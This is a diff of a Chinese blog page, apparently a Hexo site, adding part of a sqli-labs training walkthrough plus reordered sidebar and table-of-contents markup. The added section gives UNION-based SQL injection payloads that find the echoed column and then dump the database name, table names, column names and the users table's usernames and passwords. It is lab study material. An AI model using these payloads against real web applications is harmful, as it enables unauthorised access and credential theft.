+</blockquote>
+<p>这里<code>id</code>等于<code>-1</code>在 Less 1 中解释过，使原查询左边为空，使我们定义的查询结果返回。</p>
+<p><strong>注意：</strong>这里的<code>or &#39;1&#39;=&#39;1&#39;</code>是作为<code>column_3</code>的操作符，因其为永真条件，在<code>column_3</code>回显处会显示<code>1</code>，所以不能在<code>column_3</code>处注入。</p>
+<p><code>?id=-1&#39; union select 2,3,4 or &#39;1&#39;=&#39;1</code></p>
+<p>回显如下</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiZu80.png" alt="AiZu80.png"></p>
+<p>所以唯一的回显字段便是<code>username</code>即<code>column_2</code>，这也是唯一的注入点。</p>
+<h4 id="注入-3"><a href="#注入-3" class="headerlink" title="注入"></a>注入</h4><p><strong>爆库</strong></p>
+<p><code>?id=-1&#39; union select 1,database(),3 or &#39;1&#39;=&#39;1</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiZU8x.png" alt="AiZU8x.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></p>
+<p><strong>爆列</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></p>
+<p><strong>爆内容</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users),3 or &#39;1&#39;=&#39;1</code></p>
+
     </article>
     <!-- license  -->
     
@@ -812,7 +1124,7 @@ height:50vh;
             <p>原文作者：<a href="https://specters.top">Specter</a>
             </p><p>原文链接：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">https://specters.top/2019/01/29/sqli-labs靶场练习/</a>
             </p><p>发表日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">January 29th 2019, 5:05:15 pm</a>
-            </p><p>更新日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">March 11th 2019, 7:45:49 pm</a>
+            </p><p>更新日期：<a href="https://specters.top/2019/01/29/sqli-labs靶场练习/">March 12th 2019, 5:15:35 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -949,7 +1261,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识储备"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这是一些经常用到的函数"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-to-Less10"><span class="toc-number"></span> <span class="toc-text">Less-1 to Less10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-to-Less-20"><span class="toc-number"></span> <span class="toc-text">Less-11 to Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">2.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">3.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">4.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">5.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">6.</span> <span class="toc-text">Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注入方式与回显对比"><span class="toc-number">6.1.</span> <span class="toc-text">注入方式与回显对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析查询语句"><span class="toc-number">6.2.</span> <span class="toc-text">分析查询语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">7.</span> <span class="toc-text">Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注入"><span class="toc-number">7.1.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">8.</span> <span class="toc-text">Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">8.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入-1"><span class="toc-number">8.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">9.</span> <span class="toc-text">Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-1"><span class="toc-number">9.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入过程"><span class="toc-number">9.2.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-to-Less30"><span class="toc-number"></span> <span class="toc-text">Less-21 to Less30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.</span> <span class="toc-text">Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-2"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入-2"><span class="toc-number">1.2.</span> <span class="toc-text">注入</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#知识储备"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这是一些经常用到的函数"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-to-Less10"><span class="toc-number"></span> <span class="toc-text">Less-1 to Less10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-to-Less-20"><span class="toc-number"></span> <span class="toc-text">Less-11 to Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">2.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">3.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">4.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">5.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">6.</span> <span class="toc-text">Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#注入方式与回显对比"><span class="toc-number">6.1.</span> <span class="toc-text">注入方式与回显对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#分析查询语句"><span class="toc-number">6.2.</span> <span class="toc-text">分析查询语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">7.</span> <span class="toc-text">Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#派生表注入过程"><span class="toc-number">7.1.</span> <span class="toc-text">派生表注入过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-注入"><span class="toc-number">7.2.</span> <span class="toc-text">updatexml()注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#注入过程"><span class="toc-number">7.2.1.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">8.</span> <span class="toc-text">Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析"><span class="toc-number">8.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入"><span class="toc-number">8.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">9.</span> <span class="toc-text">Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-1"><span class="toc-number">9.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入-1"><span class="toc-number">9.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">10.</span> <span class="toc-text">Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-2"><span class="toc-number">10.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入过程-1"><span class="toc-number">10.2.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-to-Less30"><span class="toc-number"></span> <span class="toc-text">Less-21 to Less30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.</span> <span class="toc-text">Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-3"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入-2"><span class="toc-number">1.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">2.</span> <span class="toc-text">Less-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">3.</span> <span class="toc-text">Less-23</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#分析-4"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#注入-3"><span class="toc-number">3.2.</span> <span class="toc-text">注入</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -962,8 +1274,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
     
     
     
@@ -1352,12 +1662,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之盲注/">SQL注入之盲注</a>
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之双查询注入/">SQL注入之双查询注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之双查询注入/">SQL注入之双查询注入</a>
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/SQL注入之盲注/">SQL注入之盲注</a>
         </li>
     
     
@@ -1456,12 +1766,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/JAVA学习/">JAVA环境</a>
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/java环境配置/">JAVA环境</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/java环境配置/">JAVA环境</a>
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href="/2018/11/13/JAVA学习/">JAVA环境</a>
         </li>
     
     
@@ -1471,12 +1781,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/最长公共子序列/">最长公共子序列</a>
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/最大子段和/">最大子段和</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/最大子段和/">最大子段和</a>
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2018/11/06/最长公共子序列/">最长公共子序列</a>
         </li>
     
     
@@ -1491,12 +1801,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/hxd查看文件头-文件尾/">hxd查看文件头,文件尾</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/Linux命令简介/">Linux命令简介</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/Linux命令简介/">Linux命令简介</a>
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href="/2018/10/29/hxd查看文件头-文件尾/">hxd查看文件头,文件尾</a>
         </li>
     
     </ul></div>
@@ -1504,17 +1814,17 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
-        <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="0-1背包"><span class="iconfont-archer">&#xe606;</span>0-1背包</span>
     
         <span class="sidebar-tag-name" data-tags="完全背包"><span class="iconfont-archer">&#xe606;</span>完全背包</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="动态规划"><span class="iconfont-archer">&#xe606;</span>动态规划</span>
     
         <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
     
@@ -1529,8 +1839,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
     
         <span class="sidebar-tag-name" data-tags="upload_labs"><span class="iconfont-archer">&#xe606;</span>upload_labs</span>
-    
-        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1565,9 +1873,9 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
-    
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
     
         <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
     
